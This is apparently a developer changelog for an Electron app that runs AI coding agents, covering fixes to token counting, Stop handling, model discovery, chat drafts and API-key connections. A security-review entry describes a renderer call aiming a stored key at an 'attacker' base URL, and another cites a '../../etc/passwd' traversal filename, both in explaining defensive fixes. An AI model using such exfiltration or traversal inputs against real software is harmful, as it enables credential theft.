absent from the file list (it fails pre-fix: parks with `node_modules`).
`test/worktrees.mjs`'s first fixture now gitignores node_modules/.env — it had
been silently relying on the very leak this fixes (the symlink got committed and
applied into the live tree, so later worktrees saw it as tracked → "clean").

## 2026-08-08 — The selection badge reports the element's size

The overlay chip named the element (`svg`, `h1#hero-title`) but never said how
big it was, so the most basic measurement question in a design tool — "how wide
is this?" — cost a trip to the inspector. The chip now carries a dimmed
`724 × 38` alongside the name, DevTools-style.

Both chips are one thing now (`makeChip` in `src/preview/preload.ts`): the hover
label and the persistent selection badge shared their entire style string
already, and both anchor to the same top-left of the element's rect. Each holds
two spans — the name and the size — so the size can be restyled and refreshed
independently of the name. The hover label writes both in `drawOverlay`; the
selection badge writes its name once at pick time and lets `positionSelection`
write the size, because that's the function already re-running on every scroll,
resize and mutation with the anchor's live rect in hand. The numbers therefore
track a resize instead of freezing at whatever the layout was when the click
landed. Sizes round to whole px (border-box, `getBoundingClientRect`) — the
sub-pixel tail is layout noise at 11px type.

The multi-instance badge keeps reading `h3 × 4`; the size sits after it at 0.72
opacity, which is what separates the count's `×` from the size's.

`test/select-element.mjs` now asserts the badge's size text equals the picked
element's rounded rect (not just that *some* digits are there), and captures the
preview WebContentsView's own pixels to `07b-selection-badge.png` — that test had
no visual record of the in-preview overlay before, since the overlay never
appears in a renderer screenshot.
## 2026-08-08 — DeepSeek really runs; and replies were losing their opening

**The feature works.** The user ran `deepseek/deepseek-v4-flash` through a gateway
connection and got real multi-turn replies. An open model genuinely drives a chat
on the Codex harness — the thing that had been reasoned about but never seen.

**But the replies were beheaded, mid-word.** "ve reliable visibility…", "ing
else?". Codex streams whole `ThreadItem`s rather than deltas, so praxis remembers
how much of each item it has emitted and sends the suffix. The trap: the CLI
numbers items PER TURN (`item_0`, `item_1`, … restarting each turn) while
`emittedLen`/`statused` were session-scoped and never cleared. Turn 2's `item_0`
therefore inherited turn 1's length and had exactly that many leading characters
sliced off. It hid well because a longer reply still renders — just missing its
start — and because the first turn of any session is always correct.

The same map ran the "surface this step once" guard, so later turns also DROPPED
tool steps whose ids had been seen before. That is very likely why the chat showed
"Steps · 1 step" for turns that did more.

Fix: a per-turn `ItemTracker` (new pure `backends/codex-stream.ts`), reset at the
top of every turn, with the suffix logic and the once-per-turn guard as its two
methods. `test/codex-stream.mjs` pins both, including the exact shape of the bug
(an unreset tracker mangling turn 2) so it can't come back quietly.

**Process note, worth keeping.** Partway through this the working tree was moved
off `candidate` onto `main` by something outside this session (the agent-runner
daemon holds worktrees in this repo), and an edit landed on the wrong branch. It
was caught because a `grep` for a symbol that certainly existed came back empty.
Nothing was lost — the merge was already committed and pushed — but if you script
against this repo, re-check `git branch --show-current` after any long-running
step rather than trusting it across one.


## 2026-08-07 — The props island could open blank, and the preview could show a stranger's app

Five Electron tests were failing (`select-element`, `prop-edit`, `ready-gating`,
`style-edit`, `custom-controls`) — all in the click-to-edit path, which made a
stale-tests explanation implausible. They had two distinct product causes.

**1. The island's first state push was thrown away.** The island is a separate
`?praxisPanel=1` WebContentsView, and it is CREATED by `panel:show` — which
`PanelHost` sends *after* its first `panel:setState`. So the first push had
nowhere to land. `ensurePanelView`'s `did-finish-load` re-push was supposed to
cover that, and it can't: it fires on the page's `load` event, which beats
`PanelApp`'s mount effect registering the `panel:state` listener often enough
that a re-send delayed by a single `setTimeout(0)` lands while the synchronous
one is dropped (measured, both ways). The island then sat on `state === null` —
rendering *nothing* — until some unrelated change happened to re-push. That is
why the Svelte prop tests passed: their content-match redirect re-selects, which
pushes again. The React ones settled before the view finished loading and stayed
blank forever. The fix inverts the direction: the island PULLS
(`panel:request-state`) right after it subscribes, which is the only ordering
that cannot race its own listener. The load-event re-push is gone — one
mechanism, and it's the correct one.

**2. A reopened island could stay 160px tall.** `PanelHost` is remounted (with
its size state back at the default 316×160) every time the island is closed and
reopened, but the island PAGE lives on, so its `ResizeObserver` only speaks up
when the rendered box actually moves. Reopen on a selection whose card renders
at the same height and nothing fires — the view stays at the default with the
card clipped inside it. `PanelApp` now re-measures on every state push, which a
reopen always carries.

**3. `isPortFree` couldn't see a dual-stack occupant, so the preview attached to
someone else's server.** Node sets `SO_REUSEADDR`, so on macOS binding
`127.0.0.1:7783` SUCCEEDS while another process holds the wildcard `:::7783` —
the shape any `server.listen(port)` takes. `allocatePort` therefore handed out
an occupied port, the spawned dev server died on `EADDRINUSE`, and
`spawnDevServer`'s primary path (settle on whatever answers
`http://127.0.0.1:<port>`) settled on the squatter. Concretely: opening the
propedit fixture previewed the *selectable* fixture's page, so `style-edit` and
`custom-controls` were clicking for `#tw-box` in a document that had never heard
of it. Left-over dev servers from earlier test runs are what exposed it, but the
user-facing version is worse — any `node server.mjs` a user has running on 7777
would be previewed under their project's name. `isPortFree` now also probes the
wildcard, and votes "occupied" only on an explicit `EADDRINUSE` (a wildcard bind
refused by a sandbox or a no-IPv6 host says nothing about the port and must not
starve the whole range).

Two of the five also had genuinely wrong test code, exposed only once the port
bug stopped them failing earlier:

- **`style-edit` was driving the PREVIOUS selection's card.** Its
  `openStylesTab` polled "are the four Styles groups rendered?" — evidence that
  survives the island being closed, because closing only unmounts `PanelHost`
  while the island's own DOM stays. A straggler click from `pickElement`'s retry
  loop reset `propsIslandOpen` after `setOpen(true)`, the poll passed on the
  stale card anyway, and the BezierEditor nudge then wrote
  `transitionTimingFunction: "ease"` into `ProvenTokenCard` (`Styled.tsx:54`)
  while asserting against `TwCard` (`:5`). It now requires the island's own
  header to name the current selection — a strictly stronger check.
- **`custom-controls` was measuring timer drift, not coalescing.** Its
  scrub-cadence burst slept 250ms between `applyLiteral` calls, but a renderer's
  `setTimeout` runs ~450ms for a 250ms delay while the Electron window isn't the
  frontmost app (measured in both renderers; `visibilityState` is `visible` and
  rAF is prompt, so this is timer throttling, not a blocked thread). That alone
  pushed the burst past edit-history's 500ms window. It now paces against a
  fixed deadline and spins rather than sleeps — also the faithful model, since
  `CustomPanel`'s throttle fires every `WRITE_THROTTLE_MS` regardless of when the
  previous write resolved. Main-side apply latency is 15–135ms typically but was
  seen at 496ms once under load, so a rare flake here remains possible.

`src/main/index.ts` (panel:request-state), `src/preload/index.ts`,
`src/shared/api.ts` (`panel.requestState`),
`src/renderer/src/components/PanelApp.tsx`, `src/main/devserver-net.ts`
(`isPortFree`), `test/devserver-net.mjs` (both occupant shapes — the regression
test), `test/style-edit.mjs`, `test/custom-controls.mjs`.

## 2026-08-07 — An unsent message stays in the chat it was typed in

User-reported: type into the composer, switch chats, and the text is still
sitting there — now in front of a different conversation. ChatPanel is mounted
exactly once for the whole app (App keeps it alive so nothing re-mounts on
project switch / unhide), so `useState("")` for the composer was, by
construction, app-global: nothing about a chat switch touched it.

The composer's content now lives in `src/renderer/src/composer-drafts.ts`, keyed
by the same chat key as `useChat.byKey` (a `sessionKey`). ChatPanel derives
`input`/`attachments` from `useChat`'s `activeKey`, so a switch needs no
save/restore step at all — the draft simply *is* per-chat, and switching away
parks it while switching back brings it right where it was. Attachments ride
along with the text for the same reason: text that returns while a pasted
screenshot stayed behind in the other chat would be worse than either.

Two details worth keeping:

- **`setInput`/`setAttachments` kept their `useState` shape** (value *or*
  updater), so all nine call sites — the seed effect, the slash-menu splice,
  `send`'s clear, the FileReader callback — read exactly as before. An async
  callback that resolves after a switch writes to the chat it was started in,
  which is the right home for it.
- **`clearChat` drops the draft.** Closing a chat and reopening one that reuses
  the key (a project's default `key` after closing all of its chats) would
  otherwise open showing the dead chat's text. Writes are per-keystroke rather
  than at switch time precisely so this ordering holds — `closeChatForProject`
  clears the slice *before* it moves the visible chat.

`src/renderer/src/composer-drafts.ts` (new — also now owns the `Attachment`
type), `components/ChatPanel.tsx`, `store.ts` (`clearChat`),
`test/composer-draft.mjs` (new, electron tier).
## 2026-08-07 — The model picker asks the harnesses instead of quoting a list

User-reported: the picker still offered "GPT-5 Codex" and "GPT-5" when the Codex
CLI had long since moved to the GPT-5.6 family — so a user's first act was to
pick a model that no longer exists. The lists were two hardcoded arrays in
`providers.ts`, whose own comment defended the curation. Both harnesses can be
asked, and now are.

`src/main/model-catalog.ts` is the pure half (the `codex-retry.ts` /
`providers-store.ts` pattern — no electron, so it unit-tests under bun): the two
parsers plus a TTL cache with an injected clock and an injected baseDir. Nothing
in it throws; a model list is never worth breaking a picker or a turn for.

- **Codex** — `codex debug models` prints the CLI's whole model table as JSON
  (~300KB: every entry embeds its instruction preamble, so it's parsed and
  dropped, never logged). `visibility` is a hard filter: `gpt-5.6-sol-wm` and
  `codex-auto-review` are `"hide"`, i.e. seats the CLI itself won't offer.
  Entries sort by the CLI's own `priority`, not array position. The six that
  surface today: gpt-5.6-sol, -terra, -luna, gpt-5.5, gpt-5.4, gpt-5.4-mini.
- **Claude** — `Query.supportedModels()`, which needs a LIVE query, and
  `choices()` runs on a picker render with no session. So `backends/claude.ts`
  hands its answer to the catalog fire-and-forget next to the existing
  `supportedCommands()` call, and the catalog persists it. Real values are
  `opus[1m]`, `claude-fable-5[1m]`, `sonnet`, `sonnet[1m]`, `haiku` — none of
  which the old array had right.

`src/main/codex-models.ts` is the side-effecting half (its own file only because
`providers.ts` went past the 500-line rule with it inline; named like its
siblings `codex-usage.ts` / `codex-retry.ts`). The binary it spawns is the SDK's
**vendored** one, resolved the way `@openai/codex-sdk` resolves it (platform
package → `vendor/<triple>/bin/codex`, legacy layout too, `PRAXIS_CODEX_BIN`
first, `codex` on PATH last) — asking a global CLI of another version would
describe a binary that never runs the turns. `providers.ts` keeps only the
scheduling, and warms it once at `registerProviderIpc`, ~840ms, long before a
window exists.

`choices()` itself stays synchronous, total (every read is wrapped) and cache-only
— the refresh runs behind it, at most one probe in flight, with a 5-minute floor
between attempts so a machine with no Codex doesn't re-spawn on every render. The
one concession: a genuinely COLD catalog (first launch, nothing on disk) makes the
`providers:choices` handler wait up to 2.5s on the warm-up already running, because
the renderer's providers-store fetches once and keeps the result — returning
instantly there would pin the last-resort list for the whole session.

Two things that had to stay exactly as they were: `ModelChoice`'s shape and the
`provider[:connectionId]:modelId` namespacing (the renderer resolves picks by
`value`), and the "Default" sentinel at the top of each built-in group. The
latter needs care now — the Agent SDK's list LEADS with its own
`{value: 'default'}`, colliding exactly with ours, so a discovered `default` is
dropped in favour of praxis's (`agentModelId` maps that string to "send no
model"; two choices sharing a `value` would also be a duplicate React key).

The old arrays survive as a LAST RESORT — reached only when a seat has never been
discovered at all — with their comment rewritten to say so, and refreshed to the
2026-08-07 answers. `test/chat-render.mjs` no longer names a model id either (it
takes the first non-Default entry per group); pinning one there would have
re-introduced the same rot in the test tier.

`src/main/model-catalog.ts` (new), `src/main/codex-models.ts` (new),
`src/main/providers.ts`, `src/main/backends/claude.ts`,
`test/model-catalog.mjs` (new), `test/chat-render.mjs`, `test/run.mjs`,
`package.json`.

## 2026-08-07 — A project's fold in the rail is its own state, not "am I active"

User-reported: switching projects collapsed the one you left. The rail computed
`expanded = active && !p.chatsCollapsed`, so `chatsCollapsed` — a real per-project
field, persisted with the entry — only ever mattered for the one project that
happened to be on screen. Every other project rendered as a bare row whatever the
user had done to its chevron, and the fold "reset" on every switch.

`expanded` is now just `!p.chatsCollapsed`. The chevron is the only thing that
folds a project; switching leaves every other project exactly as it was. Three
follow-ons the change forces:

- **The glyph button always toggles.** It used to switch projects when the row
  wasn't active (there was nothing to expand). Now it folds this project's list
  and nothing else — switching stays with the name button, so a fold never drags
  the preview with it.
- **Only the active project paints an active chat row.** `isActiveChat` gained an
  `active &&`; without it every expanded background project would highlight its
  own `activeSessionKey` and the rail would show several "current" chats at once.
- **Chat rows under a background project have to go somewhere.** Clicking one
  now brings its project forward (`switchSession` records the choice on the entry
  first, then hands off to `switchTo`, which opens whatever the entry names);
  resuming a past chat from another project does the same. Both used to be
  no-ops for a non-active project because neither was reachable.

Their previous-chats lists also have to be loaded now: App only fetches history
for the project it opens/switches to, so a boot-restored sibling had none. Rail
pulls it for any expanded project that hasn't got one yet (guarded on the store's
`byKey`/`loading`, so a project with no history doesn't re-fetch). An expanded
project with nothing to list still renders the (empty) `<ul>` — `rail-chat-status`
waits on it as its "the project is open" signal — but `.rail__chats:empty` now
drops its margin, so the 5px phantom gap doesn't repeat down the rail.

`src/renderer/src/components/Rail.tsx`, `App.tsx` (`switchSession`,
`resumeRecord`), `store.ts` (doc only), `test/rail.mjs` — which now asserts B's
chats survive a switch to A, and that folding B keeps it folded when B becomes
active again.
## 2026-08-07 — Stop actually stops (and it was broken differently on each backend)

**User-reported:** a chat sat spinning for minutes at `↑0 ↓0` and pressing Stop did
nothing. Not a UI glitch — a real deadlock, and the diagnosis is worth keeping.

`q.interrupt()` is a CONTROL REQUEST. Reading the bundled SDK: its control-request
promise is settled only by a matching `control_response` from the CLI subprocess,
and nothing in that path has a timeout. So when the subprocess is wedged — request
sent, nothing ever came back, hence zero tokens in either direction — the graceful
cancel never settles, `agent:interrupt`'s `await` never returns, and the button is
inert. Meanwhile `done` is emitted from exactly ONE place (the `result` message), so
with no result the spinner spins forever. The infuriating part: the kill switch
existed all along — `shutdown()` aborts the query's AbortController — but only
session teardown ever reached it, so the user's only escape was closing the project.

Fix, in three parts. New pure `backends/interrupt.ts` races the backend's graceful
cancel against a 3s deadline and escalates to a caller-supplied kill switch; a
rejection counts as ANSWERED (killing on top of a clean stop would destroy a healthy
session), and a re-check after the race stops a late timer killing a cancel that
landed in the same tick. claude.ts escalates by aborting the query, then emits the
`error` + `done` the wedged turn never would — guarded by `hardStopped` so a
late-arriving `result` can't double-emit. `agent.ts` caps its own wait at 5s
regardless (a future backend that forgets to bound itself still can't make the
button feel broken) and, on `hardStopped`, rebuilds the chat via a
`restartChatSession` helper extracted from `agent:restart-chat` — a hard abort kills
the whole query, so without that the chat would look alive while swallowing every
later message.

**The other two backends were each wrong in a different way.** Codex was never
affected: its cancel is `turnAbort.abort()`, local and synchronous, and its turn loop
emits `done` after the break regardless — so connection-backed models (Kimi/DeepSeek)
already had the safe path. Gemini had NO `interrupt` at all, so Stop was a silent
no-op there and the turn just ran to completion; it now kills the turn's child
process, with a per-turn `turnInterrupted` flag so the resulting non-zero exit isn't
reported to the user as a crash.

`test/interrupt-escalation.mjs` pins the decisive cases (clean stop preserved,
rejection treated as answered, wedged backend killed exactly once, always resolves).

**Not reproduced.** The wedge is intermittent; this was diagnosed by reading the SDK
and the event paths, not by triggering it. The escalation logic is directly tested,
but "does this fix the wedge in the wild" is unproven — see TASKS.

## 2026-08-07 — Codex's token counters: live during the turn, and no longer double-counted

User-reported: "doesn't show tokens when I use Codex" — a screenshot of `↑ 0
↓ 0 2:31`, i.e. two and a half minutes into a turn with nothing to show for it.

Two separate problems, both found by running the real CLI
(`codex exec --experimental-json`) and reading what it actually emits.

**1. The counters were dead for the whole turn.** The SDK's `ThreadEvent` union
has no incremental usage member (verified against the event names compiled into
the CLI binary: `thread.started`, `turn.started`, `turn.completed`,
`turn.failed`, `item.*`, `error` — that's all of them), so the one reading
arrives at `turn.completed`. The status line is on screen for exactly the
period in which there is nothing to report.

The CLI *does* record the counts as it goes, just not on that stream: every
model response appends a `token_count` record to the thread's rollout at
`$CODEX_HOME/sessions/<YYYY>/<MM>/<DD>/rollout-<timestamp>-<threadId>.jsonl`.
New `src/main/codex-usage.ts` tails it — resolve the path once (a bounded
newest-first walk of the date dirs; a heavy user's session tree is large), then
one stat + a tail read per second while a turn is in flight. It's read-only, it
only runs during a turn, and if the file can't be found the behavior is exactly
what it was: `turn.completed` still delivers the full amount. A half-written
record at the tail is left for the next poll rather than parsed or skipped.

**2. Every turn after the first over-counted.** `turn.completed.usage` is a
CUMULATIVE tally for the whole thread, not that turn's own tokens — turn 1
reported 17,232 in / 5 out, turn 2 reported 34,572 / 10, which is 1 + 2, not 2.
`codex.ts` was summing those readings, so a 3-turn chat billed itself roughly
double. It now keeps a session-scoped `sentUsage` and emits `usageDelta`, the
same treatment `claude.ts` gives Anthropic's repeated readings — which is also
what lets the rollout tail and `turn.completed` share one accumulator: whatever
the tail already reported, `turn.completed` simply tops up (usually by zero).
An interrupted turn never reaches `turn.completed` at all, so the turn ends with
one final poll before the tail stops — otherwise stopping mid-turn would lose
everything it spent.

Supersedes the 2026-08-05 entry's "Codex only reports usage once, at
`turn.completed`, so its counters step at the end of a turn" — true of the SDK's
stream, but the CLI knows more than the SDK surfaces.

`test/codex-usage.mjs` (unit tier) covers the file pick, the newest-cumulative
read out of a mixed JSONL stream (`total_token_usage`, never the per-call
`last_token_usage` sitting next to it), the append-while-reading tail, and the
diff-don't-sum property, using fixture records copied verbatim from a real run.
## 2026-08-07 — v10: bring-your-own-model connections (Kimi/DeepSeek et al)

**The idea: harness and endpoint are orthogonal.** Until now "provider" meant two
things at once — which agent harness runs the loop, and which account answers. v10
splits them. The two built-in seats (Claude via the Agent SDK, Codex via
`@openai/codex-sdk`) still log in with the user's own subscription and need no
setup. A *connection* is the third path: a user-added OpenAI-compatible endpoint
(Vercel AI Gateway, Groq, anything custom) supplying a URL + key + models, so open
models like Kimi K3 or DeepSeek can drive a chat. `AgentOptions` gained
`connectionId` alongside `provider`; a set `connectionId` routes to the Codex
harness regardless of `provider` (`backends/index.ts`).

**Why the Codex harness and not Claude's.** `CodexOptions` accepts `baseUrl` +
`apiKey` + `config` per `Codex` instance, so a connection never touches the user's
`~/.codex/config.toml`. Pointing the Claude Agent SDK at non-Anthropic models would
instead mean routing its `claude_code` preset through a third-party
Anthropic-compat shim — greyer, and it loses fidelity. Codex is Apache-2.0 and
explicitly designed for custom providers. The trade-off accepted knowingly: the
Codex seat has no per-tool approval interception (its `ThreadEvent` union has no
approval-request event), so connection-backed models get the policy-level posture
Codex already used, not praxis's approve/deny cards.

**Two things the plan got wrong, both caught by probing the real vendored CLI.**
(1) `wire_api = "chat"` is DEAD — the bundled binary rejects it at config load
("no longer supported"). So a host that serves only `/chat/completions` cannot back
a connection at all. `ProviderConnection.wireApi` is therefore pinned to
`'responses'`, coerced on read AND write, and the dialog states the constraint
instead of offering a broken choice. (2) The SDK's plain `baseUrl` shortcut only
emits `openai_base_url`, leaving the built-in provider's `supports_websockets` on —
every turn then tried `ws://<host>/responses`, burned five reconnects (~10s) and
surfaced each as an `error` event, i.e. five red lines before every turn. Fixed by
registering a dedicated `model_providers."praxis-connection"` block
(`supports_websockets = false`) and selecting it, with the key passed via `apiKey`
only — never argv, never `env` (passing `env` would strip `process.env` from the
CLI). Verified: requests hit `POST <baseUrl>/responses` with our key, zero
WebSocket attempts, and with a real `codex login` active NO ChatGPT token leaks
into a connection run.

**Keys.** `providers-store.ts` is pure (injected `baseDir` + a `SecretCipher`, so it
unit-tests with no electron); `providers.ts` owns the `safeStorage` cipher, the
`providers:*` IPC and the `/models` probe. The key never crosses to the renderer —
the UI only ever sees `hasKey`, so a compromised renderer dep can't exfiltrate it.
`safeStorage` unavailable + an apiKey supplied THROWS rather than writing plaintext.
Omitting `apiKey` on save preserves the stored key, so editing a label can't wipe it.

**The picker is now model-first and built in main.** `ChatPanel.tsx`'s hardcoded
`CLAUDE_MODELS`/`CODEX_MODELS` arrays and the separate Backend dropdown are gone:
one grouped list from `providers.choices()`, where picking a model derives harness +
connection + model id atomically. The login banner still works (it keys off the now
*derived* provider) and is suppressed for connections — a connection authenticates
with its own key, so "run `codex login`" would be the wrong advice. Live `setModel`
is now gated on a `liveSwap` predicate (Claude→Claude, no connection either side);
everything else restarts just that chat, which correctly covers
connection→connection, a case the old `provider === 'codex'` check would have missed.

New: `src/main/providers-store.ts`, `src/main/providers.ts`,
`src/renderer/src/providers-store.ts`,
`src/renderer/src/components/SettingsDialog.tsx`,
`src/renderer/src/components/ProviderForm.tsx`, `test/providers-store.mjs`.

**Review caught a real hole in the key story, twice over.** The stated invariant ("a
compromised renderer dependency cannot exfiltrate keys") held for *reading* a key but
not for *aiming* one — the renderer chose the destination while main supplied the
credential. `catalog({ id, baseUrl: 'https://attacker/…' })` (ids are free from
`providers:list`) would have had main decrypt every saved key and post it as a bearer
token; and `save({ id, baseUrl: attacker })` re-pointed a connection while the
key-preserving rule silently carried its credential across to the next turn. Fixed
with one rule in one place — `sameOrigin` in providers-store.ts: a stored key may only
be sent to the origin it was entered against. `save` drops the secret when the origin
changes (path-only edits keep it — same server), `catalog` refuses a stored key aimed
elsewhere, and `ProviderForm` requires a key when the host is edited. Test-pinned.

Four smaller review findings, all fixed: a connection's 401 raised the global "sign in
with ChatGPT" banner for the perfectly healthy built-in Codex seat; `setModel` /
`setProvider` left `modelId`/`connectionId` stale, so a persisted profile could run a
different model than the picker showed; the CLI's stderr (from a process whose env
holds the key) reached the chat and the session record unscrubbed; and `isStored`
didn't validate the fields `choices()` iterates, so `"models": "gpt-5"` in a
hand-edited file would have filled the picker one character per entry. Also hardened:
Linux's `basic_text` safeStorage backend now reads as unavailable (its "encryption"
uses a hardcoded key — not what the UI promises), and providers.json is written 0600.

**Proven against a live AI Gateway, same day.** A real key, a real turn, a real edit:
`anthropic/claude-sonnet-4.6` through `https://ai-gateway.vercel.sh/v1` on the Codex
harness read the target file, made the requested change, left the untargeted function
alone, and finished in 15.5s with ZERO error events. That settles both big unknowns —
the gateway's `/responses` accepts Codex's request shape, and the
`model_providers."praxis-connection"` block is right (no reconnect attempts, so the
websockets-off entry does its job). `/models` returned 322 models.

**But the open models are still unproven, and the live run found a UX bug.** The test
key was free-tier, where every open model 403s ("Free tier users do not have access to
this model") and then 429s once the allowance is spent — only `anthropic/*` was
reachable, so Kimi's `apply_patch` reliability remains the open question and needs paid
credits. The bug: the CLI retries a failed request five times and emits EVERY attempt
as its own `error` event, so that free-tier 403 produced SIX red lines in a row — and
the six were ordered worst-last, since the attempts carry the real cause while the
terminal message says only "exceeded retry limit, last status: 429". That is the first
thing a new user would see after pasting their first key. New pure
`backends/codex-retry.ts` collapses it: attempts become `status` lines, and their
reason is grafted onto the single terminal error, so the user reads "…429 Too Many
Requests — unexpected status 403 Forbidden: Free tier users do not have access to this
model. Upgrade to paid credits…". `test/codex-retry-cause.mjs` pins it against the
messages captured verbatim from that live run.

Also observed live (logged in TASKS, not fixed): a connection run inherits the user's
global `~/.codex/config.toml` MCP servers — an unauthenticated `mcp.vercel.com` entry
on this machine dumped an OAuth blob into the turn's error text.

## 2026-08-06 — "Resolve it" no longer loops; questions run as a wizard

**Conflict resolve loop (user-reported, radial-portfolio).** Pressing the
conflict card's "Resolve it" spun and returned to the same card, forever.
Root cause in `resolveParkedChat`'s clean path: when the post-stage
`completeTurn` came back 'parked' AGAIN (autoApplyWorktree only file-copies
text files — a DELETED or binary file in the chat's diff refuses the whole
batch every time) or 'noop', the chat stayed parked but the IPC returned
`ok:true, conflicted:[]` — the renderer read "merged cleanly" while the card
re-rendered from the still-parked state. Three fixes: 'noop' now unparks
(staging proved the live tree already contains the work); 'parked' falls back
to `applyParked` — the review modal's explicit 3-way `git apply`, which
handles deletions/binary/modes (no per-file undo entries, same trade-off as
the modal) — and unparks on success; any remaining failure returns
`ok:false` + error so the card's note says WHY instead of silently resetting.
Plus a data-loss guard in `stageResolve`: it reset --hard'ed the branch to
the live snapshot BEFORE re-applying the chat's patch and ignored the apply
result — a hard apply failure left the parked work existing nowhere. Now the
pre-reset tip is captured and restored on hard failure, and the error
propagates. repo7 scenario in `test/chat-worktrees.mjs` covers the
parked-deletion chain end-to-end.

**Step-by-step questions.** A multi-question AskUserQuestion request rendered
every question at once — a wall of options. `QuestionCards` now runs
multi-question requests as a wizard: one question at a time with an "n/N"
progress chip, single-select picks auto-advance, multi-select advances via
Next, Back revisits (picks kept), the last step Sends, Skip still dismisses
the whole request. Single-question requests are pixel-identical to before
(existing tests untouched). Wizard scenario added to `test/questions.mjs`.

## 2026-08-05 — "Resolve it" couldn't actually resolve a binary conflict

Reported live: a chat replaced an image the user had also replaced (a genuine
binary conflict), parked as expected, but clicking **Resolve it** did nothing —
the banner just came back. Root cause was two compounding bugs in the park/
resolve pipeline (`chat-worktrees.ts`):

- `stageResolve`'s conflict detection only looks for `<<<<<<<` text markers,
  which a binary file can never carry. For a genuine binary conflict, the 3-way
  `git apply` either fast-forwards or silently leaves the live bytes untouched —
  either way `stageResolve` reported `clean: true` while quietly **dropping the
  chat's own change**.
- Even when that "clean" merge-back was attempted, it went through
  `completeTurn` → `autoApplyWorktree`, which unconditionally refuses the
  *whole* batch the instant any file's content contains a NUL byte (its binary
  heuristic) — so it just re-parked, silently, every time.

Fixed both: `stageResolve` now compares the post-apply file against the chat's
own target blob (read via `git show <chatHeadBeforeReset>:<path>`, captured
before the live-snapshot reset erases the ref) and, when they differ and the
blob is binary, resolves by policy — keep the chat's version, which is what the
review UI already told the user Resolve does; there's no way to byte-merge two
PNGs. Landed alongside the 2026-08-06 fix below (independent discovery of an
overlapping bug — merged together): its `resolveParkedChat` → `applyParked`
fallback is what actually lands the resolved binary content, since
`autoApplyWorktree` refuses any batch containing binary regardless of who
resolved it. Covered by a new `repo8` case in `test/chat-worktrees.mjs`
(alongside that entry's `repo7` deletion case). Known follow-up, not fixed
here: a turn that mixes a
binary conflict with an overlapping *text* conflict still routes its post-agent
merge through the ordinary `completeTurn` and would re-park on the binary file
(the 2026-08-06 entry above fixes the *looping* half of that, generally, via
an `applyParked` fallback in `resolveParkedChat` — this entry's `stageResolve`
policy fix is what makes the specific binary case resolve to the right bytes
instead of the wrong ones once that fallback runs).

## 2026-08-05 — A shared image now comes with its path, not just its pixels (LKM-67)

A non-image file dropped into the composer already rode along as an absolute
path the agent could read. An image didn't: it became a base64 vision block and
nothing else. So the model could *see* the screenshot perfectly and still had no
file to copy into the repo — it would answer "I need the file path on your
computer, could you tell me where this is saved?", which is an absurd question
to ask about an image the user just handed it.

Both kinds of image now carry a path, and `send` names it in the same hidden
context block the file attachments use:

- **Dropped from Finder** — it already has one. `addImageFiles` calls the same
  `pathForFile` preload seam `addFiles` does, so the real location rides along.
- **Pasted from the clipboard** — there is no file anywhere; it's bytes in
  memory. `attachments:save` writes them into
  `<userData>/praxis/attachments/<stamp>-<name>.<ext>` and hands back that path.

The save happens at **send**, not at paste: an attachment the user thinks better
of and removes should never touch the disk. It's also best-effort — a refused or
failed save just yields no path, which is exactly today's behavior (vision block
alone), never a broken turn. `src/main/attachments.ts` holds the naming/writing/
pruning (pure, fs-only, so `test/attachments.mjs` covers it); the media type
picks the extension from a fixed table and the browser-supplied filename is
reduced to a bare stem, so a name like `../../etc/passwd` can only ever produce
`<stamp>-passwd.png` inside the attachments dir. Saved copies older than a week
are swept on the next save — these are scratch copies of clipboard bytes, not
app state.

The composer chip's tooltip now shows that path for images too (it already did
for file cards), so "what exactly am I sending?" is answerable before sending.
## 2026-08-05 — Composer attachments line up with the prompt text (LKM-66)

A pasted image (or dropped file) chip floated in the middle of the composer
instead of sitting above the caret. The row wasn't styled centred — shadcn's
`InputGroup` is `flex items-center`, and the block-end addon (the model/permission
bar) flips it to `flex-col` via `has-[>[data-align=block-end]]:flex-col`, so every
direct child without `w-full` shrinks to fit and centres on the cross axis. The
chip row now takes `w-full` and the textarea's own 14px left padding, which is the
same fix `Inspector` (the selection pill row) already carried. `test/chat-render.mjs`
asserts the numbers — chip's left edge == where the placeholder starts, row width
== the textarea's — since the alignment IS the requirement.

## 2026-08-05 — Rail chats got a status dot and an inline rename (LKM-65)

The rail listed a project's chats as bare names, so nothing distinguished a chat
still thinking from one that had finished and was waiting to be read — the whole
point of running several at once. Each chat row now leads with a dot:

- **hollow ring** — stale: nothing in flight, nothing new. Every past chat, and
  every live one you've already read.
- **filled grey, blinking** — a turn is in flight.
- **filled green** — a turn finished while you were looking at a *different*
  chat. `finish` sets `needsReview` only when the key it's given isn't the
  active one and that chat was actually running (the bare `finish()` calls that
  clear a reopened session's stale flag must not light it), and `setActiveChat`
  clears it: opening a chat IS reading it. A turn that lands on screen never
  goes green — you watched it happen.

The dot sits in a 16px slot with the project row's own padding (8) and gap (7),
which is the project glyph's geometry exactly — so dots centre on the folder
icon above them while the names still start at 31px, the project name's indent.
`test/rail-chat-status.mjs` asserts both numerically rather than by screenshot,
since the alignment is the requirement. The spawn rows' old inline 5px
`.rail__sdot` folded into the same slot (queued → idle, running → working),
which also stops a background agent's name sitting 11px right of every other.

Renaming is a hover pencil that swaps the row for an input (Enter/blur commits,
Escape reverts, an empty or unchanged name is a cancel). Main stays the only
writer of a name: `agent:rename-chat` writes it onto the LIVE session's record —
which is what makes it persist on teardown, survive a reload through the
workspace snapshot, and permanently block `maybeGenerateTitle` (it skips any
chat whose record already has a name) — then re-broadcasts it as the usual
`title` event. `sessions:rename` does the same for a past record. Both normalise
the input (one line, collapsed whitespace, 120 cap) and the renderer adopts what
main echoes back rather than the raw keystrokes.

`Rail.tsx` was already near the size limit, so the row itself moved to
`RailChatRow.tsx` and now renders all three kinds (live, spawn, past).

## 2026-08-05 — A pasted link no longer drags the chat bubble off the pane (LKM-64)

Paste a Figma embed URL into an ask and the bubble hung off the LEFT edge of
the chat pane, its first half unreadable. Two causes, both fixed:

- **The bubble is sized to its content** (`w-fit`) and a URL is a single
  unbreakable token, so `fit-content` resolved to the width of the whole link.
  `.msg__text` now sets `overflow-wrap: anywhere` — deliberately not
  `break-word`: both wrap an over-long token, but only `anywhere` also shrinks
  the element's *min-content* width, which is the number `w-fit` is measured
  against. `break-word` alone would still have measured the unbroken link and
  spilled. `max-w-full` caps it as a backstop, and `.markdown` got the same
  wrap so an assistant turn printing a long URL can't widen the pane either.
- **The clamp is vertical only.** `ClampedUserText`'s 5-line cap does nothing
  about width, and even a wrapped link is three lines of query-string noise.
  `src/renderer/src/lib/elide-url.ts` (new, pure — `test/elide-url.mjs`) splits
  an ask into text/link runs and shortens each link to the two parts a human
